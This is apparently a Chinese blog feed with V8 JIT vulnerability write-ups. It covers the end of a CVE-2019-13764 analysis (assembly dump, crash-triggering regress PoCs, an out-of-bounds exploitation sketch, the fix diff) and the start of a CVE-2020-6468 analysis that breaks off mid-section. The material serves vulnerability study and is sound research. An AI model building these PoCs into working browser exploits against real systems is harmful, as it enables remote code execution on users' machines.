<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">-inf(初始值) =&gt; -inf(bound_min+increment_min) =&gt; -inf(与initial value比较后的结果)</span><br></pre></td></tr></table></figure>
<p>这样使得最终的 min 值为 -inf。</p>
</li>
<li>
<p>错误的 Phi 结点的 Range 将导致错误的类型传播。这样会使得控制流非常容易地进入 deopt 环节。该漏洞触发的 int3 断点就是位于编译生成的 JIT 代码中 deopt 环节内部。由于 turboFan 中传播了错误的类型，使得 deopt 无法识别出该调用的 deopt 函数，因此控制流将陷入死循环，频繁触发本不该执行到的 int3 断点。</p>
<p>以下是 turboFan 第一次编译生成的汇编代码：</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="number">0x118a80d82e20</span>     <span class="number">0</span>  488d1df9ffffff       REX<span class="number">.</span>W leaq <span class="built_in">rbx</span>,[<span class="built_in">rip</span>+<span class="number">0xfffffff9</span>]</span><br><span class="line"><span class="number">0x118a80d82e27</span>     <span class="number">7</span>  483bd9               REX<span class="number">.</span>W cmpq <span class="built_in">rbx</span>,<span class="built_in">rcx</span></span><br><span class="line"><span class="number">0x118a80d82e2a</span>     a  <span class="number">7418</span>                 <span class="keyword">jz</span> <span class="number">0x118a80d82e44</span>  &lt;+<span class="number">0x24</span>&gt;</span><br><span class="line"><span class="number">0x118a80d82e2c</span>     c  48ba0000000036000000 REX<span class="number">.</span>W <span class="keyword">movq</span> <span class="built_in">rdx</span>,<span class="number">0x3600000000</span></span><br><span class="line"><span class="number">0x118a80d82e36</span>    <span class="number">16</span>  49ba803d5202157f0000 REX<span class="number">.</span>W <span class="keyword">movq</span> <span class="built_in">r10</span>,<span class="number">0x7f1502523d80</span>  (Abort)    <span class="comment">;; off heap target</span></span><br><span class="line"><span class="number">0x118a80d82e40</span>    <span class="number">20</span>  41ffd2               <span class="keyword">call</span> <span class="built_in">r10</span></span><br><span class="line"><span class="number">0x118a80d82e43</span>    <span class="number">23</span>  cc                   int3l</span><br><span class="line"><span class="number">0x118a80d82e44</span>    <span class="number">24</span>  488b59e0             REX<span class="number">.</span>W <span class="keyword">movq</span> <span class="built_in">rbx</span>,[<span class="built_in">rcx</span>-<span class="number">0x20</span>]</span><br><span class="line"><span class="number">0x118a80d82e48</span>    <span class="number">28</span>  f6430f01             testb [<span class="built_in">rbx</span>+<span class="number">0xf</span>],<span class="number">0x1</span></span><br><span class="line"><span class="number">0x118a80d82e4c</span>    2c  <span class="number">740d</span>                 <span class="keyword">jz</span> <span class="number">0x118a80d82e5b</span>  &lt;+<span class="number">0x3b</span>&gt;</span><br><span class="line"><span class="number">0x118a80d82e4e</span>    2e  49bac0914602157f0000 REX<span class="number">.</span>W <span class="keyword">movq</span> <span class="built_in">r10</span>,<span class="number">0x7f15024691c0</span>  (CompileLazyDeoptimizedCode)    <span class="comment">;; off heap target</span></span><br><span class="line"><span class="number">0x118a80d82e58</span>    <span class="number">38</span>  41ffe2               <span class="keyword">jmp</span> <span class="built_in">r10</span></span><br><span class="line"><span class="number">0x118a80d82e5b</span>    3b  <span class="number">55</span>                   <span class="keyword">push</span> <span class="built_in">rbp</span></span><br><span class="line"><span class="number">0x118a80d82e5c</span>    3c  4889e5               REX<span class="number">.</span>W <span class="keyword">movq</span> <span class="built_in">rbp</span>,<span class="built_in">rsp</span></span><br><span class="line"><span class="number">0x118a80d82e5f</span>    3f  <span class="number">56</span>                   <span class="keyword">push</span> <span class="built_in">rsi</span></span><br><span class="line"><span class="number">0x118a80d82e60</span>    <span class="number">40</span>  <span class="number">57</span>                   <span class="keyword">push</span> <span class="built_in">rdi</span></span><br><span class="line"><span class="number">0x118a80d82e61</span>    <span class="number">41</span>  48ba0000000022000000 REX<span class="number">.</span>W <span class="keyword">movq</span> <span class="built_in">rdx</span>,<span class="number">0x2200000000</span></span><br><span class="line"><span class="number">0x118a80d82e6b</span>    4b  4c8b15c6ffffff       REX<span class="number">.</span>W <span class="keyword">movq</span> <span class="built_in">r10</span>,[<span class="built_in">rip</span>+<span class="number">0xffffffc6</span>]</span><br><span class="line"><span class="number">0x118a80d82e72</span>    <span class="number">52</span>  41ffd2               <span class="keyword">call</span> <span class="built_in">r10</span></span><br><span class="line"><span class="number">0x118a80d82e75</span>    <span class="number">55</span>  cc                   int3l</span><br><span class="line">---------------------------------------- Main Code ------------------------------------------------</span><br><span class="line"><span class="number">0x118a80d82e76</span>    <span class="number">56</span>  4883ec08             REX<span class="number">.</span>W subq <span class="built_in">rsp</span>,<span class="number">0x8</span></span><br><span class="line"><span class="number">0x118a80d82e7a</span>    5a  488975b0             REX<span class="number">.</span>W <span class="keyword">movq</span> [<span class="built_in">rbp</span>-<span class="number">0x50</span>],<span class="built_in">rsi</span></span><br><span class="line"><span class="number">0x118a80d82e7e</span>    5e  488b55d8             REX<span class="number">.</span>W <span class="keyword">movq</span> <span class="built_in">rdx</span>,[<span class="built_in">rbp</span>-<span class="number">0x28</span>]</span><br><span class="line"><span class="number">0x118a80d82e82</span>    <span class="number">62</span>  f6c201               testb <span class="built_in">rdx</span>,<span class="number">0x1</span></span><br><span class="line"><span class="number">0x118a80d82e85</span>    <span class="number">65</span>  0f859a000000         <span class="keyword">jnz</span> <span class="number">0x118a80d82f25</span>  &lt;+<span class="number">0x105</span>&gt;</span><br><span class="line"><span class="number">0x118a80d82e8b</span>    6b  48b90000000010270000 REX<span class="number">.</span>W <span class="keyword">movq</span> <span class="built_in">rcx</span>,<span class="number">0x271000000000</span></span><br><span class="line"><span class="number">0x118a80d82e95</span>    <span class="number">75</span>  483bd1               REX<span class="number">.</span>W cmpq <span class="built_in">rdx</span>,<span class="built_in">rcx</span></span><br><span class="line"><span class="number">0x118a80d82e98</span>    <span class="number">78</span>  0f8c0b000000         <span class="keyword">jl</span> <span class="number">0x118a80d82ea9</span>  &lt;+<span class="number">0x89</span>&gt;</span><br><span class="line"><span class="number">0x118a80d82e9e</span>    7e  498b4520             REX<span class="number">.</span>W <span class="keyword">movq</span> <span class="built_in">rax</span>,[<span class="built_in">r13</span>+<span class="number">0x20</span>] (root (undefined_value))</span><br><span class="line"><span class="number">0x118a80d82ea2</span>    <span class="number">82</span>  488be5               REX<span class="number">.</span>W <span class="keyword">movq</span> <span class="built_in">rsp</span>,<span class="built_in">rbp</span></span><br><span class="line"><span class="number">0x118a80d82ea5</span>    <span class="number">85</span>  <span class="number">5d</span>                   <span class="keyword">pop</span> <span class="built_in">rbp</span></span><br><span class="line"><span class="number">0x118a80d82ea6</span>    <span class="number">86</span>  c20800               <span class="keyword">ret</span> <span class="number">0x8</span></span><br><span class="line">---------------------------------------- Deopt Code ---------------------------------------------</span><br><span class="line"><span class="number">0x118a80d82ea9</span>    <span class="number">89</span>  493b65e0             REX<span class="number">.</span>W cmpq <span class="built_in">rsp</span>,[<span class="built_in">r13</span>-<span class="number">0x20</span>] (external value (StackGuard::address_of_jslimit()))</span><br><span class="line"><span class="number">0x118a80d82ead</span>    <span class="number">8d</span>  0f8629000000         <span class="keyword">jna</span> <span class="number">0x118a80d82edc</span>  &lt;+<span class="number">0xbc</span>&gt;</span><br><span class="line"><span class="number">0x118a80d82eb3</span>    <span class="number">93</span>  48b979fa19a6632d0000 REX<span class="number">.</span>W <span class="keyword">movq</span> <span class="built_in">rcx</span>,<span class="number">0x2d63a619fa79</span>    <span class="comment">;; object: 0x2d63a619fa79  从此处开始进入循环</span></span><br><span class="line"><span class="number">0x118a80d82ebd</span>    <span class="number">9d</span>  48bf39d619a6632d0000 REX<span class="number">.</span>W <span class="keyword">movq</span> <span class="built_in">rdi</span>,<span class="number">0x2d63a619d639</span>    <span class="comment">;; object: 0x2d63a619d639  value=0x2d63a619fa79 &gt;</span></span><br><span class="line"><span class="number">0x118a80d82ec7</span>    a7  48394f17             REX<span class="number">.</span>W cmpq [<span class="built_in">rdi</span>+<span class="number">0x17</span>],<span class="built_in">rcx</span></span><br><span class="line"><span class="number">0x118a80d82ecb</span>    ab  0f8560000000         <span class="keyword">jnz</span> <span class="number">0x118a80d82f31</span>  &lt;+<span class="number">0x111</span>&gt;</span><br><span class="line"><span class="number">0x118a80d82ed1</span>    b1  493b65e0             REX<span class="number">.</span>W cmpq <span class="built_in">rsp</span>,[<span class="built_in">r13</span>-<span class="number">0x20</span>] (external value (StackGuard::address_of_jslimit()))</span><br><span class="line"><span class="number">0x118a80d82ed5</span>    b5  0f862a000000         <span class="keyword">jna</span> <span class="number">0x118a80d82f05</span>  &lt;+<span class="number">0xe5</span>&gt;</span><br><span class="line"><span class="number">0x118a80d82edb</span>    bb  cc                   int3l                            <span class="comment">;; 由于始终无法满足当前代码段的各个跳出循环的条件，因此将频繁触发此处的断点</span></span><br><span class="line"><span class="number">0x118a80d82edc</span>    bc  48bb307ba501157f0000 REX<span class="number">.</span>W <span class="keyword">movq</span> <span class="built_in">rbx</span>,<span class="number">0x7f1501a57b30</span>    <span class="comment">;; external reference (Runtime::StackGuard)</span></span><br><span class="line"><span class="number">0x118a80d82ee6</span>    c6  33c0                 xorl <span class="built_in">rax</span>,<span class="built_in">rax</span></span><br><span class="line"><span class="number">0x118a80d82ee8</span>    c8  48be311818a6632d0000 REX<span class="number">.</span>W <span class="keyword">movq</span> <span class="built_in">rsi</span>,<span class="number">0x2d63a6181831</span>    <span class="comment">;; object: 0x2d63a6181831 </span></span><br><span class="line"><span class="number">0x118a80d82ef2</span>    d2  49baa0de7302157f0000 REX<span class="number">.</span>W <span class="keyword">movq</span> <span class="built_in">r10</span>,<span class="number">0x7f150273dea0</span>  (CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)    <span class="comment">;; off heap target</span></span><br><span class="line"><span class="number">0x118a80d82efc</span>    dc  41ffd2               <span class="keyword">call</span> <span class="built_in">r10</span></span><br><span class="line"><span class="number">0x118a80d82eff</span>    df  488b55d8             REX<span class="number">.</span>W <span class="keyword">movq</span> <span class="built_in">rdx</span>,[<span class="built_in">rbp</span>-<span class="number">0x28</span>]</span><br><span class="line"><span class="number">0x118a80d82f03</span>    e3  ebae                 <span class="keyword">jmp</span> <span class="number">0x118a80d82eb3</span>  &lt;+<span class="number">0x93</span>&gt;      <span class="comment">;; 跳转回上面的代码</span></span><br><span class="line"><span class="number">0x118a80d82f05</span>    e5  488b1dd2ffffff       REX<span class="number">.</span>W <span class="keyword">movq</span> <span class="built_in">rbx</span>,[<span class="built_in">rip</span>+<span class="number">0xffffffd2</span>]</span><br><span class="line"><span class="number">0x118a80d82f0c</span>    ec  33c0                 xorl <span class="built_in">rax</span>,<span class="built_in">rax</span></span><br><span class="line"><span class="number">0x118a80d82f0e</span>    ee  48be311818a6632d0000 REX<span class="number">.</span>W <span class="keyword">movq</span> <span class="built_in">rsi</span>,<span class="number">0x2d63a6181831</span>    <span class="comment">;; object: 0x2d63a6181831 </span></span><br><span class="line"><span class="number">0x118a80d82f18</span>    f8  4c8b15d5ffffff REX<span class="number">.</span>W <span class="keyword">movq</span> <span class="built_in">r10</span>,[<span class="built_in">rip</span>+<span class="number">0xffffffd5</span>]</span><br><span class="line"><span class="number">0x118a80d82f1f</span>    ff  41ffd2               <span class="keyword">call</span> <span class="built_in">r10</span></span><br><span class="line"><span class="number">0x118a80d82f22</span>   <span class="number">102</span>  ebb7                 <span class="keyword">jmp</span> <span class="number">0x118a80d82edb</span>  &lt;+<span class="number">0xbb</span>&gt;</span><br><span class="line"><span class="number">0x118a80d82f24</span>   <span class="number">104</span>  <span class="number">90</span>                   <span class="keyword">nop</span></span><br><span class="line"><span class="number">0x118a80d82f25</span>   <span class="number">105</span>  49c7c500000000       REX<span class="number">.</span>W <span class="keyword">movq</span> <span class="built_in">r13</span>,<span class="number">0x0</span>      <span class="comment">;; de<span class="doctag">bug:</span> deopt position, script offset '170'</span></span><br><span class="line">                                                                   <span class="comment">;; de<span class="doctag">bug:</span> deopt position, inlining id '-1'</span></span><br><span class="line">                                                                   <span class="comment">;; de<span class="doctag">bug:</span> deopt reason 'not a Smi'</span></span><br><span class="line">                                                                   <span class="comment">;; de<span class="doctag">bug:</span> deopt index 0</span></span><br><span class="line"><span class="number">0x118a80d82f2c</span>   10c  e80ff10300           <span class="keyword">call</span> <span class="number">0x118a80dc2040</span>     <span class="comment">;; eager deoptimization bailout</span></span><br><span class="line"><span class="number">0x118a80d82f31</span>   <span class="number">111</span>  49c7c501000000       REX<span class="number">.</span>W <span class="keyword">movq</span> <span class="built_in">r13</span>,<span class="number">0x1</span>      <span class="comment">;; de<span class="doctag">bug:</span> deopt position, script offset '190'</span></span><br><span class="line">                                                                   <span class="comment">;; de<span class="doctag">bug:</span> deopt position, inlining id '-1'</span></span><br><span class="line">                                                                   <span class="comment">;; de<span class="doctag">bug:</span> deopt reason 'wrong call target'</span></span><br><span class="line">                                                                   <span class="comment">;; de<span class="doctag">bug:</span> deopt index 1</span></span><br><span class="line"><span class="number">0x118a80d82f38</span>   <span class="number">118</span>  e803f10300           <span class="keyword">call</span> <span class="number">0x118a80dc2040</span>     <span class="comment">;; eager deoptimization bailout</span></span><br><span class="line"><span class="number">0x118a80d82f3d</span>   <span class="number">11d</span>  49c7c502000000       REX<span class="number">.</span>W <span class="keyword">movq</span> <span class="built_in">r13</span>,<span class="number">0x2</span>      <span class="comment">;; de<span class="doctag">bug:</span> deopt position, script offset '152'</span></span><br><span class="line">                                                                   <span class="comment">;; de<span class="doctag">bug:</span> deopt position, inlining id '-1'</span></span><br><span class="line">                                                                   <span class="comment">;; de<span class="doctag">bug:</span> deopt reason '(unknown)'</span></span><br><span class="line">                                                                   <span class="comment">;; de<span class="doctag">bug:</span> deopt index 2</span></span><br><span class="line"><span class="number">0x118a80d82f44</span>   <span class="number">124</span>  e8f7f00700           <span class="keyword">call</span> <span class="number">0x118a80e02040</span>     <span class="comment">;; lazy deoptimization bailout</span></span><br><span class="line"><span class="number">0x118a80d82f49</span>   <span class="number">129</span>  49c7c503000000       REX<span class="number">.</span>W <span class="keyword">movq</span> <span class="built_in">r13</span>,<span class="number">0x3</span>      <span class="comment">;; de<span class="doctag">bug:</span> deopt position, script offset '37'</span></span><br><span class="line">                                                                   <span class="comment">;; de<span class="doctag">bug:</span> deopt position, inlining id '0'</span></span><br><span class="line">                                                                   <span class="comment">;; de<span class="doctag">bug:</span> deopt reason '(unknown)'</span></span><br><span class="line">                                                                   <span class="comment">;; de<span class="doctag">bug:</span> deopt index 3</span></span><br><span class="line"><span class="number">0x118a80d82f50</span>   <span class="number">130</span>  e8ebf00700           <span class="keyword">call</span> <span class="number">0x118a80e02040</span>     <span class="comment">;; lazy deoptimization bailout</span></span><br><span class="line"><span class="number">0x118a80d82f55</span>   <span class="number">135</span>  0f1f00               <span class="keyword">nop</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Issue 中给出的 Regress 单元测试文件如下（也可以称为PoC）：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">function <span class="title">write</span><span class="params">(begin, end, step)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (var i = begin; i &gt;= end; i += step) &#123;</span><br><span class="line">    step = end - begin;</span><br><span class="line">    begin &gt;&gt;&gt;= <span class="number">805306382</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">function <span class="title">bar</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (let i = <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++) &#123;</span><br><span class="line">    write(Infinity, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">%PrepareFunctionForOptimization(write);</span><br><span class="line">%PrepareFunctionForOptimization(bar);</span><br><span class="line">bar();</span><br><span class="line">%OptimizeFunctionOnNextCall(bar);</span><br><span class="line">bar();</span><br></pre></td></tr></table></figure>
<p>成功触发 SIGTRAP：</p>
<p><img src="/2021/02/CVE-2019-13764/sigtrap.png" alt="img"></p>
<p>查看Turbolizer，可以发现这个归纳变量 <code>i</code> 的范围为 <code>-inf ~ inf</code></p>
<blockquote>
<p>一个循环内部会有多个 Phi 结点，以PoC为例，由于变量begin、i、step的值分别从循环内部和循环外部的数据流流入，因此是 Phi 类型的结点。</p>
</blockquote>
<p><img src="/2021/02/CVE-2019-13764/phi1.png" alt="img"><br>
详细输出如下。可以看到 bound_type、initial_type 以及 increment_type 的范围与我们所预期的相符，因为 bound value 和 initial value 分别是传入 write 函数的 <code>1</code> 和 <code>Infinity</code>，而 increment value 为 $1 -  inf = -inf$。但归纳变量 <code>i</code> 的范围却错误的设置为 <code>-inf ~ inf</code>，而不是 <code>inf ~ inf</code>。</p>
<p>同时我们还可以注意到此时的 <code>initial_type value + increment_type value = inf + (-inf) = NaN</code></p>
<blockquote>
<p>以下部分输出，是打patch后的输出结果。</p>
</blockquote>
<p><img src="/2021/02/CVE-2019-13764/output.png" alt="img"></p>
</li>
<li>
<p>理解完上面的漏洞原理后，我们便可以略微修改一下Poc，更加进一步的理解到其中的细节：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">step</span>) </span>&#123;</span><br><span class="line">  step = -<span class="literal">Infinity</span>;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    initial_type   range =&gt; inf ~ inf</span></span><br><span class="line"><span class="comment">    bounds_type    range =&gt; 1 ~ 1</span></span><br><span class="line"><span class="comment">    increment_type range =&gt; -inf ~ inf</span></span><br><span class="line"><span class="comment">    =&gt; i           range =&gt; -inf ~ inf</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="literal">Infinity</span>; i &gt;= <span class="number">1</span>; i += -<span class="literal">Infinity</span>) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++) &#123;</span><br><span class="line">    write(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">%PrepareFunctionForOptimization(write);</span><br><span class="line">%PrepareFunctionForOptimization(bar);</span><br><span class="line">bar();</span><br><span class="line">%OptimizeFunctionOnNextCall(bar);</span><br><span class="line">bar();</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="四、漏洞利用">四、漏洞利用</h2>
<ul>
<li>
<p>笔者原本以为这样的漏洞有点鸡肋，但直到又遇上了这个漏洞的子漏洞 - <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1051017" target="_blank" rel="noopener">Issue 1051017: Security: Type inference issue in Typer::Visitor::TypeInductionVariablePhi</a></p>
<p>这里只简单的说一下，通过简单的绕过，我们可以使 InductionVariable 的值为 NaN，但 type 为 kInterger。这样就会导致 turboFan 推测的类型与实际类型不符。于是我们可以根据这个来编写 exp 达到 OOB 的目的。</p>
<p>由于之前的补丁修改了 checkBounds 的优化机制，因此我们没有办法再通过优化 checkBounds 来进行越界读写。但我们可以利用 <code>ReduceJSCreateArray</code>的优化机制进行越界读写，具体原因是，该函数将使用 length 的<strong>推测值</strong>来分配 backing_store 的大小，但只会在运行时将 length 的<strong>运行时值</strong>赋值到该数组的 length 字段。如果 length 的<strong>推测值</strong>小于<strong>运行时值</strong>，那就可以进行 OOB。</p>
</li>
<li>
<p>更具体地细节可以进入上面 Isuue 链接中学习，由于 Issue 中利用细节较为详尽，因此此处不再赘述。</p>
</li>
</ul>
<h2 id="五、后记">五、后记</h2>
<ul>
<li>
<p>漏洞修复见如下链接 - <a href="https://chromium.googlesource.com/v8/v8.git/+/b8b6075021ade0969c6b8de9459cd34163f7dbe1%5E%21/#F1" target="_blank" rel="noopener">revision</a>，其中增加了对 NaN 的检测。</p>
<p>如果 initial_type 和 increment_type 相加后为 NaN ，则将当前分析回退至更保守的 Phi 类型处理。</p>
<blockquote>
<p>需要注意的是，该补丁仍然没有包含所有可能的 NaN 情况。具体请看 <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1051017" target="_blank" rel="noopener">Issue 1051017: Security: Type inference issue in Typer::Visitor::TypeInductionVariablePhi</a></p>
</blockquote>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="meta">@@ -847,13 +847,30 @@</span></span><br><span class="line">   DCHECK_EQ(IrOpcode::kLoop, NodeProperties::GetControlInput(node)-&gt;opcode());</span><br><span class="line">   DCHECK_EQ(2, NodeProperties::GetControlInput(node)-&gt;InputCount());</span><br><span class="line"> </span><br><span class="line"><span class="addition">+  auto res = induction_vars_-&gt;induction_variables().find(node-&gt;id());</span></span><br><span class="line"><span class="addition">+  DCHECK(res != induction_vars_-&gt;induction_variables().end());</span></span><br><span class="line"><span class="addition">+  InductionVariable* induction_var = res-&gt;second;</span></span><br><span class="line"><span class="addition">+  InductionVariable::ArithmeticType arithmetic_type = induction_var-&gt;Type();</span></span><br><span class="line">   Type initial_type = Operand(node, 0);</span><br><span class="line">   Type increment_type = Operand(node, 2);</span><br><span class="line"> </span><br><span class="line"><span class="addition">+  const bool both_types_integer = initial_type.Is(typer_-&gt;cache_-&gt;kInteger) &amp;&amp;</span></span><br><span class="line"><span class="addition">+                                  increment_type.Is(typer_-&gt;cache_-&gt;kInteger);</span></span><br><span class="line">   // 增加了对 NaN 的判断</span><br><span class="line"><span class="addition">+  bool maybe_nan = false;</span></span><br><span class="line"><span class="addition">+  // The addition or subtraction could still produce a NaN, if the integer</span></span><br><span class="line"><span class="addition">+  // ranges touch infinity.</span></span><br><span class="line"><span class="addition">+  if (both_types_integer) &#123;</span></span><br><span class="line"><span class="addition">+    Type resultant_type =</span></span><br><span class="line"><span class="addition">+        (arithmetic_type == InductionVariable::ArithmeticType::kAddition)</span></span><br><span class="line"><span class="addition">+            ? typer_-&gt;operation_typer()-&gt;NumberAdd(initial_type, increment_type)</span></span><br><span class="line"><span class="addition">+            : typer_-&gt;operation_typer()-&gt;NumberSubtract(initial_type,</span></span><br><span class="line"><span class="addition">+                                                        increment_type);</span></span><br><span class="line"><span class="addition">+    maybe_nan = resultant_type.Maybe(Type::NaN());</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line">   // We only handle integer induction variables (otherwise ranges</span><br><span class="line">   // do not apply and we cannot do anything).</span><br><span class="line"><span class="deletion">-  if (!initial_type.Is(typer_-&gt;cache_-&gt;kInteger) ||</span></span><br><span class="line"><span class="deletion">-      !increment_type.Is(typer_-&gt;cache_-&gt;kInteger)) &#123;</span></span><br><span class="line">   // 增加了对 NaN 的处理，对于 NaN 这种情况，使用保守方式进行处理。</span><br><span class="line"><span class="addition">+  if (!both_types_integer || maybe_nan) &#123;</span></span><br><span class="line">     // Fallback to normal phi typing, but ensure monotonicity.</span><br><span class="line">     // (Unfortunately, without baking in the previous type, monotonicity might</span><br><span class="line">     // be violated because we might not yet have retyped the incrementing</span><br><span class="line"><span class="meta">@@ -874,12 +891,6 @@</span></span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   // Now process the bounds.</span><br><span class="line"><span class="deletion">-  auto res = induction_vars_-&gt;induction_variables().find(node-&gt;id());</span></span><br><span class="line"><span class="deletion">-  DCHECK(res != induction_vars_-&gt;induction_variables().end());</span></span><br><span class="line"><span class="deletion">-  InductionVariable* induction_var = res-&gt;second;</span></span><br><span class="line"><span class="deletion">-</span></span><br><span class="line"><span class="deletion">-  InductionVariable::ArithmeticType arithmetic_type = induction_var-&gt;Type();</span></span><br><span class="line"><span class="deletion">-</span></span><br><span class="line">   double min = -V8_INFINITY;</span><br><span class="line">   double max = V8_INFINITY;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="六、参考">六、参考</h2>
<ul>
<li>
<p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1028863" target="_blank" rel="noopener">Issue 1028863: v8: Wrong JIT code that triggers SIGTRAP at runtime</a></p>
</li>
<li>
<p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1051017" target="_blank" rel="noopener">Issue 1051017: Security: Type inference issue in Typer::Visitor::TypeInductionVariablePhi</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>vulnerability analysis</category>
        <category>v8</category>
      </categories>
      <tags>
        <tag>v8</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2020-6468 分析</title>
    <url>/2021/02/CVE-2020-6468/</url>
    <content><![CDATA[<h2 id="一、前言">一、前言</h2>
<ul>
<li>
<p>CVE-2020-6468 是 v8 中的一个位于 <code>DeadCodeElimination::ReduceDeoptimizeOrReturnOrTerminateOrTailCall</code> 函数的 JIT 漏洞。通过该漏洞攻击者可<strong>触发类型混淆</strong>并<strong>修改数组的长度</strong>，这会导致<strong>任意越界读写</strong>并可进一步达到 <strong>RCE</strong>。</p>
<p>具体的说，就是可以在 CheckMaps 结点前向目标对象内部写入 -1，在被认出对象类型前成功修改数组长度。</p>
</li>
<li>
<p>测试用的 v8 版本为 <code>8.1.307</code> 。</p>
</li>
</ul>
<a id="more"></a>
<ul>
<li>由于这是笔者初次学习 JIT 中的 type confusion漏洞，因此可能会存在错误或一些较为模糊的地方，如有问题还请师傅们斧正。</li>
</ul>
<h2 id="二、环境搭建">二、环境搭建</h2>
<ul>
<li>
<p>切换 v8 版本，然后编译：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git checkout 8.1.307</span><br><span class="line">gclient sync</span><br><span class="line">tools/dev/v8gen.py x64.debug</span><br><span class="line">ninja -C out.gn/x64.debug</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>启动 turbolizer。如果原先版本的 turbolizer 无法使用，则可以使用在线版本的 turbolizer <a href="https://v8.github.io/tools/v8.1/turbolizer/index.html" target="_blank" rel="noopener">v8.1</a></p>
<blockquote>
<p>v8 tools 的根目录在 <a href="https://v8.github.io/tools" target="_blank" rel="noopener">此处</a></p>
</blockquote>
</li>
</ul>
<h2 id="三、漏洞细节">三、漏洞细节</h2>
<h3 id="1-前置知识">1. 前置知识</h3>
<h4 id="a-PrepareFunctionForOptimization">a. %PrepareFunctionForOptimization</h4>
<ul>
<li>
<p>v8 中内置了一些 runtime 函数，可以在启动 d8 时追加<code>--allow-natives-syntax</code>参数来启动内置函数的使用。</p>
</li>
<li>
<p><code>%PrepareFunctionForOptimization</code> 是 v8 众多内置函数中的其中一个。该函数可以为 JIT 优化函数前做准备，确保 JSFunction 存在 FeedbackVector等相关的结构（在必要时甚至会先编译该函数）。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 调用链如下</span></span><br><span class="line">Runtime_PrepareFunctionForOptimization</span><br><span class="line">  <span class="function"><span class="keyword">bool</span> <span class="title">EnsureFeedbackVector</span><span class="params">(Handle&lt;JSFunction&gt; function)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">void</span> <span class="title">JSFunction::EnsureFeedbackVector</span><span class="params">(Handle&lt;JSFunction&gt; function)</span></span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>由于该内置函数只是为对应的 JSFunction <strong>准备 FeedbackVector</strong>（请记住这个准备操作），因此<strong>可以通过多次调用目标函数</strong>来准备 FeedbackVector，替换该内置函数的调用。</p>
</li>
</ul>
<h4 id="b-JIT-kThrow结点">b. JIT kThrow结点</h4>
<p><code>Throw</code> 类型的结点将以如下调用链添加进 BytecodeGraph 中：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BytecodeGraphBuilder::BuildGraphFromBytecode</span><span class="params">(...)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">void</span> <span class="title">BytecodeGraphBuilder::CreateGraph</span><span class="params">()</span></span></span><br><span class="line"><span class="function">      <span class="keyword">void</span> <span class="title">BytecodeGraphBuilder::VisitBytecodes</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        <span class="keyword">void</span> <span class="title">BytecodeGraphBuilder::VisitSingleBytecode</span><span class="params">()</span></span></span><br><span class="line">          void BytecodeGraphBuilder::VisitThrow() \</span><br><span class="line">          void BytecodeGraphBuilder::VisitAbort() \</span><br><span class="line">          <span class="function"><span class="keyword">void</span> <span class="title">BytecodeGraphBuilder::VisitReThrow</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure>
<p>我们可以直接在 JS 代码中插入一条 <code>throw</code> 语句来生成一个 <code>Throw</code> 字节码：</p>
<p><img src="/2021/02/CVE-2020-6468/throw_bytecode.png" alt="img"></p>
<p>实际上，Throw 结点在v8中频繁产生。归根到底，是因为对于图中控制流不可能到达的结点，turboFan 会将其更换成 throw 结点，这与 v8 C++ 代码中 <code>UNREACHABLE</code> 函数的使用，有着异曲同工之处。</p>
<h4 id="c-JIT-kTerminate-结点">c. JIT kTerminate 结点</h4>
<ul>
<li>
<p><code>Terminate</code> 类型的结点，将以如下调用链，添加进 BytecodeGraph 中：</p>
